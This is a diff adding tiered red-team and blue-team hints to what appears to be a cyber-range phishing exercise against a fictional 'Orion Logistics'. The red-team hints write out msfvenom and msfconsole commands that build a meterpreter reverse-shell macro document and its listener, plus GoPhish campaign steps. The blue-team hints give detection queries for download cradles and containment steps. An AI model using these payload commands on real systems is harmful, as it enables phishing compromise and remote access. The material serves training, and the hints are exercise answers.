@@ -10,6 +10,21 @@
         "L1": "You have a pretext and targets. What makes a phishing payload actually execute when the target opens it? Think about the difference between a payload that looks dangerous and one that gets past defenses.",
         "L2": "For document-based payloads: macros require user interaction (Enable Content click). HTA files execute directly. The GoPhish landing page can capture credentials without any payload at all if the pretext is convincing enough.",
         "L3": "Configure GoPhish: Landing page at 172.20.3.40:3333. Set your sending profile to use the Postfix server at 172.20.3.20. Use the 'Orion_Q4_Invoice' template already in GoPhish. Set tracking pixel to confirm email opens before analyzing click data."
+      },
+      "3": {
+        "L1": "Your pretext is ready and your target list is confirmed. Now you need a payload that will execute silently when the victim interacts with it. What execution technique minimizes user friction while maximizing execution probability?",
+        "L2": "msfvenom generates shellcode-based payloads embedded in documents. A reverse TCP payload phones home to your listener on port 4444. The payload format matters — a .docm (macro-enabled Word document) blends into a logistics invoice pretext naturally.",
+        "L3": "Generate payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.20.3.10 LPORT=4444 -f docm -o invoice_Q4.docm`. Start listener: `msfconsole -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 172.20.3.10; set LPORT 4444; run'`. Alternatively use: `nc -lvp 4444` with a simpler shell payload."
+      },
+      "4": {
+        "L1": "Your payload is ready and your listener is up. The campaign is about to launch. How do you confirm delivery and execution before declaring success? What metric tells you the campaign worked?",
+        "L2": "GoPhish tracks three events in order: email delivered → email opened (tracking pixel) → link clicked → form submitted. A reverse shell callback only fires when the victim opens the attachment. Monitor your nc/msfconsole listener — the callback is your FLAG.",
+        "L3": "Launch in GoPhish: Campaigns → New Campaign → select 'Orion_Q4_Invoice' template + your target group → Launch. Monitor: GoPhish dashboard shows real-time open/click events. Watch your listener — a callback from 172.20.3.30 (the simulated endpoint) means FLAG-SC03-1 is ready to submit. Run `whoami` and `hostname` on the shell to document the access."
+      },
+      "5": {
+        "L1": "You have achieved the objective. Before closing out, your deliverable is a phishing simulation report — not just a list of what you did, but an analysis that helps the client improve their defenses. What metrics matter most to an executive?",
+        "L2": "Phishing simulation reports quantify risk: click rate (% of targets who clicked), open rate (% who opened the email), and callback rate (% who executed the payload). These numbers translate directly to business risk statements. Compare against industry benchmarks.",
+        "L3": "Structure your report: Executive Summary (click rate X%, baseline risk rating) → Campaign Parameters (pretext used, targeting methodology) → Results Table (opens/clicks/callbacks by department) → Technical Analysis (SPF/DKIM/DMARC gaps, email gateway gaps) → Recommendations (security awareness training frequency, DMARC enforcement policy: p=reject, email gateway sandbox config). Export from your notebook using 'Generate report'."
       }
     },
     "blue": {
@@ -17,6 +32,16 @@
         "L1": "You've received a report of a suspicious email. What header fields tell you whether the sending domain is legitimately authorized to send email on behalf of Orion Logistics?",
         "L2": "Check SPF (Return-Path domain vs sending IP), DKIM (signature validation), and DMARC (policy and alignment). A spoofed email will typically fail at least one of these checks if the domain has proper email security configured.",
         "L3": "In the email headers: look for `Authentication-Results` header. Splunk: `index=mail sourcetype=postfix | search subject=invoice | table _time, from, to, authentication_results`. A fail on SPF + DKIM = likely spoofed. Then check if the same message reached multiple recipients."
+      },
+      "2": {
+        "L1": "The suspicious email was opened. Now you need to determine if the payload executed. What Windows security events indicate that a document opened a child process — the classic sign of macro execution?",
+        "L2": "Event ID 4688 (Process Creation) with a parent process of WINWORD.EXE or EXCEL.EXE spawning cmd.exe or powershell.exe is the definitive macro execution indicator. Event ID 4104 captures PowerShell script block logging — look for download cradle patterns like `IEX` or `DownloadString`.",
+        "L3": "Splunk: `index=windows EventCode=4688 ParentProcessName=*WINWORD* | table _time, ComputerName, NewProcessName, CommandLine`. For PowerShell: `index=windows EventCode=4104 | search ScriptBlockText=*IEX* OR ScriptBlockText=*DownloadString* | table _time, ComputerName, ScriptBlockText`. Any match is a confirmed execution — escalate to CRITICAL and move to containment immediately."
+      },
+      "3": {
+        "L1": "Macro execution is confirmed and the host has called back to an external C2 server. You need to stop the attacker's access without tipping them off to destroy evidence. What is the correct sequence of containment actions?",
+        "L2": "Containment sequence: (1) capture volatile evidence from the endpoint (running processes, network connections) before isolation, (2) block the C2 IP at the perimeter firewall, (3) isolate the endpoint at the network switch level (not just Windows Firewall — the attacker may have disabled it), (4) force password resets for all accounts that touched that machine.",
+        "L3": "Evidence capture first: `netstat -ano` and `tasklist /v` on the endpoint via remote management. Block C2: perimeter firewall rule `deny outbound to <C2_IP>/32`. Network isolation: disable the switch port or VLAN-hop the host to a quarantine VLAN. Splunk: `index=windows EventCode=4625 | stats count by TargetUserName | sort -count` — check for credential spray from the compromised host. IOC list for your IR report: attacker IP, C2 IP, payload filename, macro hash, affected user account, affected hostname."
       }
     }
   }
